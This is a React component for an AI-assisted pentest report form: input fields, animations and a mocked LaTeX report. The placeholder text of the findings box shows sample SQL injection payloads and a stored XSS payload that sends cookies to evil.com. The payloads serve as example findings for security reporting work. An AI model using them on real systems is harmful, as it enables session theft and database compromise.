"use client";

import { useState, useCallback, useRef } from "react";
import { useRouter } from "next/navigation";
import {
  motion,
  AnimatePresence,
  useReducedMotion,
} from "framer-motion";
import {
  Sparkles,
  Wand2,
  FileText,
  Shield,
  AlertTriangle,
  ArrowLeft,
  ChevronRight,
  ClipboardPaste,
  Brain,
  ImageIcon,
  Building2,
  Target,
} from "lucide-react";
import { cn } from "@/lib/utils";
import { useRole } from "@/hooks/use-role";
import { Select } from "@/components/FormElements/select";
import InputGroup from "@/components/FormElements/InputGroup";
import { LatexEditor } from "@/components/latex-editor";
import { AIAttachmentZone, type PoCImage } from "@/components/FormElements/ai-attachment-zone";
import { MagicButton } from "@/components/ui/magic-button";
import { TypewriterText } from "@/components/ui/typewriter-text";
import {
  AISkeleton,
  AIShimmerBar,
  AIErrorShake,
  AIWaveShimmer,
} from "@/components/ui/ai-skeleton";

/* ─── Types ─────────────────────────────────────────── */

interface AIReportFormProps {
  customers: { id: string; name: string }[];
}

type GenerationStep = "idle" | "generating" | "done" | "error";

interface GeneratedContent {
  executiveSummary: string;
  impact: string;
  recommendation: string;
  scope: string;
}

/* ─── Helpers ───────────────────────────────────────── */

function generatePenDocId(): string {
  const now = new Date();
  const pad = (n: number) => String(n).padStart(2, "0");
  return `PEN-DOC-${now.getFullYear()}${pad(now.getMonth() + 1)}${pad(now.getDate())}${pad(now.getHours())}${pad(now.getMinutes())}`;
}

/* ─── Animation Variants ────────────────────────────── */

const cardVariants = {
  hidden: { opacity: 0, y: 24 },
  visible: (i: number) => ({
    opacity: 1,
    y: 0,
    transition: { delay: i * 0.07, duration: 0.45, ease: "easeOut" as const },
  }),
};

const outputRevealVariants = {
  hidden: { opacity: 0, height: 0 },
  visible: {
    opacity: 1,
    height: "auto" as const,
    transition: { duration: 0.5, ease: "easeOut" as const },
  },
};

/* ─── Simulated AI Responses ────────────────────────── */

const MOCK_AI_RESPONSE: GeneratedContent = {
  executiveSummary:
    "\\section{Executive Summary}\n\nA comprehensive security assessment was conducted on the target application infrastructure. " +
    "The engagement identified \\textbf{3 Critical}, \\textbf{5 High}, and \\textbf{8 Medium} severity vulnerabilities " +
    "across the application stack. Key findings include SQL injection vectors in the authentication module, " +
    "insecure direct object references (IDOR) in the API layer, and insufficient input validation on file upload endpoints.\n\n" +
    "The overall security posture requires \\textbf{immediate remediation} of critical findings before production deployment.",
  impact:
    "\\section{Impact Analysis}\n\n\\textbf{Business Impact:} Exploitation of the identified vulnerabilities could lead to " +
    "unauthorized access to sensitive customer data, including PII and financial records. " +
    "The SQL injection vulnerability alone could enable full database compromise.\n\n" +
    "\\textbf{Technical Impact:} An attacker could achieve remote code execution (RCE) through " +
    "the chained exploitation of the file upload vulnerability and path traversal finding. " +
    "This would grant complete control over the application server.",
  recommendation:
    "\\section{Recommendations}\n\n\\begin{enumerate}\n" +
    "\\item Implement parameterized queries across all database interactions\n" +
    "\\item Deploy role-based access control (RBAC) to mitigate IDOR findings\n" +
    "\\item Add server-side file type validation with magic number verification\n" +
    "\\item Enable Content Security Policy (CSP) headers to reduce XSS impact\n" +
    "\\item Conduct a follow-up assessment after remediation\n" +
    "\\end{enumerate}",
  scope:
    "\\section{Scope}\n\nThe assessment covered the following targets:\n\\begin{itemize}\n" +
    "\\item Web Application: \\texttt{https://app.example.com}\n" +
    "\\item REST API: \\texttt{https://api.example.com/v2}\n" +
    "\\item Authentication Service: \\texttt{https://auth.example.com}\n" +
    "\\end{itemize}",
};

/* ─── Main Component ────────────────────────────────── */

export default function AIReportForm({ customers }: AIReportFormProps) {
  const router = useRouter();
  const prefersReduced = useReducedMotion();
  const { isAdmin } = useRole();

  /* ── State ── */
  const [step, setStep] = useState<GenerationStep>("idle");
  const [errorShake, setErrorShake] = useState(false);
  const [generated, setGenerated] = useState<GeneratedContent | null>(null);
  const [revealIndex, setRevealIndex] = useState(0);

  // Identity & Metadata
  const [title, setTitle] = useState("");
  const [reportId] = useState(generatePenDocId);

  // AI Raw Input
  const [rawFindings, setRawFindings] = useState("");
  const [aiContext, setAiContext] = useState("");
  const [pocImages, setPocImages] = useState<PoCImage[]>([]);

  // Scope (LaTeX)
  const [scopeValue, setScopeValue] = useState("");

  const customerOptions = customers.map((c) => ({
    value: c.id,
    label: c.name,
  }));

  const outputsRef = useRef<HTMLDivElement>(null);

  /* ── Validation ── */
  const isFormValid =
    title.trim().length > 0 && rawFindings.trim().length > 0;

  /* ── Generate handler ── */
  const handleGenerate = useCallback(async () => {
    if (!isFormValid) return;

    setStep("generating");
    setGenerated(null);
    setRevealIndex(0);
    setErrorShake(false);

    try {
      // Simulate AI API call — replace with real endpoint
      await new Promise((resolve) => setTimeout(resolve, 2800));

      // 10% simulated errors for demo
      if (Math.random() < 0.1) {
        throw new Error("AI service temporarily unavailable");
      }

      setGenerated(MOCK_AI_RESPONSE);
      setStep("done");

      // Scroll to outputs
      setTimeout(() => {
        outputsRef.current?.scrollIntoView({
          behavior: "smooth",
          block: "start",
        });
      }, 300);
    } catch {
      setStep("error");
      setErrorShake(true);
      setTimeout(() => setErrorShake(false), 500);
    }
  }, [isFormValid]);

  /* ── Section reveal sequencing ── */
  const handleSectionRevealed = useCallback(() => {
    setRevealIndex((prev) => prev + 1);
  }, []);

  /* ── Glass card helper ── */
  const glassCard = cn(
    "relative overflow-hidden rounded-xl border p-6 shadow-sm transition-shadow duration-200",
    "bg-white/70 backdrop-blur-md dark:bg-white/[0.03] dark:backdrop-blur-lg",
    "border-stroke/60 dark:border-dark-3/60",
    "hover:shadow-lg hover:border-purple-300/40 dark:hover:border-purple-500/25",
  );

  return (
    <div className="space-y-6">
      {/* ─── Header ─── */}
      <motion.div
        initial={prefersReduced ? false : { opacity: 0, y: -10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.3 }}
        className="flex items-center gap-3"
      >
        <button
          type="button"
          onClick={() => router.back()}
          className="flex h-9 w-9 items-center justify-center rounded-lg border border-stroke text-dark-5 transition-colors hover:bg-gray-2 dark:border-dark-3 dark:text-dark-6 dark:hover:bg-dark-3"
        >
          <ArrowLeft size={16} />
        </button>
        <div className="flex-1">
          <h2 className="text-lg font-semibold text-dark dark:text-white">
            AI-Powered Report
          </h2>
          <p className="text-xs text-dark-5 dark:text-dark-6">
            Paste your raw findings, attach PoC screenshots, and let AI draft
            the full report
          </p>
        </div>
        <div className="flex h-9 items-center gap-1.5 rounded-full bg-gradient-to-r from-purple-500/10 to-blue-500/10 px-4 text-xs font-medium text-purple-600 dark:from-purple-500/20 dark:to-blue-500/20 dark:text-purple-400">
          <Sparkles size={14} />
          Autopilot
        </div>
      </motion.div>

      {/* ════════════════════════════════════════════════
           BENTO GRID — Identity & Metadata + AI Input
         ════════════════════════════════════════════════ */}
      <div className="grid grid-cols-1 gap-5 xl:grid-cols-12">
        {/* ─── Col 1: Identity & Metadata (4 cols) ─── */}
        <motion.div
          custom={0}
          variants={cardVariants}
          initial={prefersReduced ? false : "hidden"}
          animate="visible"
          className={cn(glassCard, "xl:col-span-4")}
        >
          <SectionHeader
            icon={<Building2 size={16} />}
            title="Identity & Metadata"
          />

          <div className="mt-5 space-y-4">
            {/* Customer */}
            <Select
              label="Customer"
              name="customerId"
              placeholder="Select a customer"
              items={customerOptions}
            />

            {/* Report ID */}
            <InputGroup
              label="Report ID"
              name="reportIdCustom"
              type="text"
              placeholder="PEN-DOC-YYYYMMDDHHmm"
              defaultValue={reportId}
            />

            {/* Report Title */}
            <InputGroup
              label="Report Title"
              name="title"
              type="text"
              placeholder="e.g. Web App Pentest — Acme Corp"
              required
              value={title}
              handleChange={(e) => setTitle(e.target.value)}
            />

            {/* Status */}
            <Select
              label="Status"
              name="status"
              defaultValue="Draft"
              items={
                isAdmin
                  ? [
                      { value: "Draft", label: "Draft" },
                      { value: "Open", label: "Open (Submit)" },
                      { value: "Closed", label: "Closed" },
                    ]
                  : [
                      { value: "Draft", label: "Draft" },
                      { value: "Open", label: "Open (Submit)" },
                    ]
              }
            />

            {/* Scope */}
            <div>
              <LatexEditor
                label="Scope"
                name="scope"
                value={scopeValue}
                onChange={setScopeValue}
                height="160px"
                placeholder="Define targets and scope in LaTeX…"
              />
            </div>
          </div>
        </motion.div>

        {/* ─── Col 2: AI Raw Input Area (8 cols) ─── */}
        <div className="space-y-5 xl:col-span-8">
          {/* ── Raw Findings Notes ── */}
          <motion.div
            custom={1}
            variants={cardVariants}
            initial={prefersReduced ? false : "hidden"}
            animate="visible"
            className={cn(glassCard)}
          >
            <AIWaveShimmer active={step === "generating"} />

            <SectionHeader
              icon={<ClipboardPaste size={16} />}
              title="Raw Findings Notes"
              badge="Required"
            />

            <p className="mt-1 text-xs text-dark-5 dark:text-dark-6">
              Paste your unstructured pentest notes, tool outputs, Burp logs,
              or any findings data. The AI will process and structure them.
            </p>

            <textarea
              value={rawFindings}
              onChange={(e) => setRawFindings(e.target.value)}
              rows={10}
              placeholder={`Example:\n\n[CRITICAL] SQL Injection in /api/v2/users?id=1' OR 1=1--\nParameter: id (GET)\nPayload: 1' UNION SELECT username,password FROM users--\nImpact: Full database dump, authentication bypass\n\n[HIGH] Stored XSS in user profile bio field\nEndpoint: POST /api/profile/update\nPayload: <script>document.location='https://evil.com/?c='+document.cookie</script>\nImpact: Session hijacking, account takeover\n\n[MEDIUM] IDOR on /api/documents/{id}\nAuthenticated user can access other users' documents by changing the id parameter.`}
              className={cn(
                "mt-3 w-full rounded-lg border border-stroke bg-transparent px-4 py-3 font-mono text-sm",
                "text-dark placeholder:text-dark-5/60",
                "dark:border-dark-3 dark:text-white dark:placeholder:text-dark-6/50",
                "outline-none focus:border-primary transition-colors",
                "resize-y",
              )}
            />
          </motion.div>

          {/* ── AI Context / Strategic Instructions ── */}
          <motion.div
            custom={2}
            variants={cardVariants}
            initial={prefersReduced ? false : "hidden"}
            animate="visible"
            className={cn(glassCard)}
          >
            <SectionHeader
              icon={<Brain size={16} />}
              title="AI Context & Strategic Instructions"
              badge="Optional"
            />

            <p className="mt-1 text-xs text-dark-5 dark:text-dark-6">
              Provide additional context, methodology notes, or specific
              instructions for the AI (e.g. tone, audience, compliance
              frameworks to reference).
            </p>

            <textarea
              value={aiContext}
              onChange={(e) => setAiContext(e.target.value)}
              rows={4}
              placeholder="e.g. 'Use formal tone. OWASP Testing Guide v4.2 methodology. Target audience is CTO-level executives. Include MITRE ATT&CK mapping for each finding.'"
              className={cn(
                "mt-3 w-full rounded-lg border border-stroke bg-transparent px-4 py-3 text-sm",
                "text-dark placeholder:text-dark-5/60",
                "dark:border-dark-3 dark:text-white dark:placeholder:text-dark-6/50",
                "outline-none focus:border-primary transition-colors",
                "resize-y",
              )}
            />
          </motion.div>

          {/* ── PoC Attachments ── */}
          <motion.div
            custom={3}
            variants={cardVariants}
            initial={prefersReduced ? false : "hidden"}
            animate="visible"
            className={cn(glassCard)}
          >
            <SectionHeader
              icon={<ImageIcon size={16} />}
              title="PoC Screenshots & Evidence"
            />

            <p className="mb-3 mt-1 text-xs text-dark-5 dark:text-dark-6">
              Upload proof-of-concept screenshots. These will be referenced in
              the generated report as evidence for each finding.
            </p>

            <AIAttachmentZone
              images={pocImages}
              onChange={setPocImages}
              label="PoC Attachments"
            />
          </motion.div>
        </div>
      </div>

      {/* ─── Generate Button (full-width) ─── */}
      <motion.div
        custom={4}
        variants={cardVariants}
        initial={prefersReduced ? false : "hidden"}
        animate="visible"
        className="flex items-center justify-between rounded-xl border border-dashed border-purple-300/60 bg-gradient-to-r from-purple-50/80 via-white to-blue-50/80 p-5 dark:border-purple-500/30 dark:from-purple-900/10 dark:via-transparent dark:to-blue-900/10"
      >
        <div className="flex items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-purple-100 dark:bg-purple-900/30">
            <Wand2 size={18} className="text-purple-600 dark:text-purple-400" />
          </div>
          <div>
            <p className="text-sm font-medium text-dark dark:text-white">
              Ready to generate?
            </p>
            <p className="text-xs text-dark-5 dark:text-dark-6">
              {isFormValid
                ? "All required fields filled. Click to start AI generation."
                : "Fill in Report Title and Raw Findings Notes to proceed."}
            </p>
          </div>
        </div>

        <MagicButton
          onClick={handleGenerate}
          disabled={!isFormValid}
          loading={step === "generating"}
        >
          {step === "generating" ? (
            <>
              <motion.span
                animate={!prefersReduced ? { rotate: 360 } : undefined}
                transition={{
                  duration: 1,
                  repeat: Infinity,
                  ease: "linear",
                }}
              >
                <Sparkles size={16} />
              </motion.span>
              Generating…
            </>
          ) : (
            <>
              <Wand2 size={16} />
              Generate with AI
            </>
          )}
        </MagicButton>
      </motion.div>

      {/* ════════════════════════════════════════════════
           GENERATION PROGRESS — Skeleton Cards
         ════════════════════════════════════════════════ */}
      <AnimatePresence>
        {step === "generating" && (
          <motion.div
            initial={{ opacity: 0, height: 0 }}
            animate={{ opacity: 1, height: "auto" }}
            exit={{ opacity: 0, height: 0 }}
            transition={{ duration: 0.3 }}
          >
            <div className={cn(glassCard)}>
              <AIShimmerBar className="mb-4" />
              <div className="mb-4 flex items-center gap-2">
                <motion.span
                  animate={!prefersReduced ? { rotate: 360 } : undefined}
                  transition={{
                    duration: 2,
                    repeat: Infinity,
                    ease: "linear",
                  }}
                >
                  <Sparkles size={16} className="text-purple-500" />
                </motion.span>
                <span className="text-sm font-medium text-dark dark:text-white">
                  AI is analyzing your findings and crafting the report…
                </span>
              </div>
              <div className="grid grid-cols-1 gap-4 md:grid-cols-2">
                {[
                  "Executive Summary",
                  "Impact Analysis",
                  "Recommendations",
                  "Scope",
                ].map((label, i) => (
                  <div
                    key={label}
                    className="rounded-lg border border-stroke/50 bg-white/50 p-4 dark:border-dark-3/50 dark:bg-white/[0.02]"
                  >
                    <p className="mb-3 text-xs font-medium text-dark-5 dark:text-dark-6">
                      {label}
                    </p>
                    <AISkeleton lines={3 + i} />
                  </div>
                ))}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ════════════════════════════════════════════════
           ERROR STATE
         ════════════════════════════════════════════════ */}
      <AnimatePresence>
        {step === "error" && (
          <AIErrorShake trigger={errorShake}>
            <motion.div
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="rounded-xl border border-red-200 bg-red-50/80 p-6 backdrop-blur-sm dark:border-red-900/40 dark:bg-red-950/20"
            >
              <div className="flex items-center gap-3">
                <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-red-100 dark:bg-red-900/30">
                  <AlertTriangle
                    size={20}
                    className="text-red-600 dark:text-red-400"
                  />
                </div>
                <div>
                  <p className="text-sm font-medium text-red-800 dark:text-red-300">
                    Generation failed
                  </p>
                  <p className="text-xs text-red-600/80 dark:text-red-400/70">
                    The AI service encountered an error. Please try again.
                  </p>
                </div>
                <button
                  type="button"
                  onClick={handleGenerate}
                  className="ml-auto rounded-lg border border-red-300 px-4 py-2 text-sm font-medium text-red-700 transition-colors hover:bg-red-100 dark:border-red-800 dark:text-red-300 dark:hover:bg-red-900/30"
                >
                  Retry
                </button>
              </div>
            </motion.div>
          </AIErrorShake>
        )}
      </AnimatePresence>

      {/* ════════════════════════════════════════════════
           GENERATED OUTPUT — Typewriter Reveal
         ════════════════════════════════════════════════ */}
      <AnimatePresence>
        {step === "done" && generated && (
          <motion.div
            ref={outputsRef}
            variants={outputRevealVariants}
            initial="hidden"
            animate="visible"
            className="space-y-5"
          >
            {/* Output header */}
            <div className="flex items-center gap-2">
              <div className="h-px flex-1 bg-gradient-to-r from-transparent via-purple-300 to-transparent dark:via-purple-600/40" />
              <span className="flex items-center gap-1.5 text-xs font-medium text-purple-600 dark:text-purple-400">
                <Sparkles size={12} />
                AI-Generated Output
              </span>
              <div className="h-px flex-1 bg-gradient-to-r from-transparent via-purple-300 to-transparent dark:via-purple-600/40" />
            </div>

            {/* Bento output grid */}
            <div className="grid grid-cols-1 gap-5 lg:grid-cols-2">
              {/* Executive Summary (full width) */}
              <div className="lg:col-span-2">
                <GeneratedOutputCard
                  index={0}
                  revealIndex={revealIndex}
                  icon={<FileText size={16} />}
                  title="Executive Summary"
                  content={generated.executiveSummary}
                  onRevealed={handleSectionRevealed}
                  prefersReduced={!!prefersReduced}
                  glassCard={glassCard}
                />
              </div>

              {/* Impact */}
              <GeneratedOutputCard
                index={1}
                revealIndex={revealIndex}
                icon={<Shield size={16} />}
                title="Impact Analysis"
                content={generated.impact}
                onRevealed={handleSectionRevealed}
                prefersReduced={!!prefersReduced}
                glassCard={glassCard}
              />

              {/* Recommendations */}
              <GeneratedOutputCard
                index={2}
                revealIndex={revealIndex}
                icon={<AlertTriangle size={16} />}
                title="Recommendations"
                content={generated.recommendation}
                onRevealed={handleSectionRevealed}
                prefersReduced={!!prefersReduced}
                glassCard={glassCard}
              />

              {/* Scope (full width) */}
              <div className="lg:col-span-2">
                <GeneratedOutputCard
                  index={3}
                  revealIndex={revealIndex}
                  icon={<Target size={16} />}
                  title="Scope"
                  content={generated.scope}
                  onRevealed={handleSectionRevealed}
                  prefersReduced={!!prefersReduced}
                  glassCard={glassCard}
                />
              </div>
            </div>

            {/* Action buttons */}
            <motion.div
              initial={prefersReduced ? false : { opacity: 0, y: 10 }}
              animate={
                revealIndex >= 4
                  ? { opacity: 1, y: 0 }
                  : { opacity: 0, y: 10 }
              }
              transition={{ duration: 0.4, delay: 0.2 }}
              className="flex justify-end gap-3"
            >
              <button
                type="button"
                onClick={() => {
                  setStep("idle");
                  setGenerated(null);
                }}
                className="rounded-lg border border-stroke px-6 py-2.5 text-sm font-medium text-dark transition-colors hover:bg-gray-2 dark:border-dark-3 dark:text-white dark:hover:bg-dark-3"
              >
                Regenerate
              </button>
              <button
                type="button"
                onClick={() => router.push("/reports/create")}
                className="flex items-center gap-2 rounded-lg bg-primary px-6 py-2.5 text-sm font-medium text-white transition-colors hover:bg-primary/90"
              >
                Use in Report
                <ChevronRight size={16} />
              </button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

/* ════════════════════════════════════════════════════════
   Sub-components
   ════════════════════════════════════════════════════════ */

/* ─── Section Header ────────────────────────────────── */

function SectionHeader({
  icon,
  title,
  badge,
}: {
  icon: React.ReactNode;
  title: string;
  badge?: string;
}) {
  return (
    <div className="flex items-center gap-2">
      <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-purple-100 text-purple-600 dark:bg-purple-900/30 dark:text-purple-400">
        {icon}
      </div>
      <h3 className="text-base font-semibold text-dark dark:text-white">
        {title}
      </h3>
      {badge && (
        <span
          className={cn(
            "ml-auto rounded-full px-2.5 py-0.5 text-[10px] font-medium",
            badge === "Required"
              ? "bg-red-100 text-red-600 dark:bg-red-900/30 dark:text-red-400"
              : "bg-gray-100 text-dark-5 dark:bg-dark-3 dark:text-dark-6",
          )}
        >
          {badge}
        </span>
      )}
    </div>
  );
}

/* ─── Generated Output Card ─────────────────────────── */

interface GeneratedOutputCardProps {
  index: number;
  revealIndex: number;
  icon: React.ReactNode;
  title: string;
  content: string;
  onRevealed: () => void;
  prefersReduced: boolean;
  glassCard: string;
}

function GeneratedOutputCard({
  index,
  revealIndex,
  icon,
  title,
  content,
  onRevealed,
  prefersReduced,
  glassCard,
}: GeneratedOutputCardProps) {
  const isActive = revealIndex >= index;
  const isRevealing = revealIndex === index;

  return (
    <motion.div
      custom={index}
      variants={cardVariants}
      initial={prefersReduced ? false : "hidden"}
      animate={isActive ? "visible" : "hidden"}
      whileHover={
        prefersReduced
          ? undefined
          : { y: -4, transition: { duration: 0.2 } }
      }
      className={cn(
        glassCard,
        isRevealing &&
          "border-purple-300/70 ring-1 ring-purple-200/40 dark:border-purple-500/40 dark:ring-purple-800/30",
      )}
    >
      {/* Active shimmer */}
      {isRevealing && <AIShimmerBar className="mb-3" />}

      <div className="mb-3 flex items-center gap-2">
        <div className="flex h-7 w-7 items-center justify-center rounded-md bg-purple-100 text-purple-600 dark:bg-purple-900/30 dark:text-purple-400">
          {icon}
        </div>
        <h4 className="text-sm font-semibold text-dark dark:text-white">
          {title}
        </h4>
        {isRevealing && (
          <motion.span
            animate={!prefersReduced ? { rotate: 360 } : undefined}
            transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
            className="ml-auto"
          >
            <Sparkles size={12} className="text-purple-400" />
          </motion.span>
        )}
      </div>

      {isActive && (
        <div className="rounded-lg bg-slate-50/80 p-4 font-mono text-xs leading-relaxed text-dark dark:bg-slate-800/40 dark:text-slate-200">
          <TypewriterText
            text={content}
            mode="word"
            speed={25}
            skipAnimation={prefersReduced || !isRevealing}
            onComplete={isRevealing ? onRevealed : undefined}
            showCursor={isRevealing}
          />
        </div>
      )}
    </motion.div>
  );
}
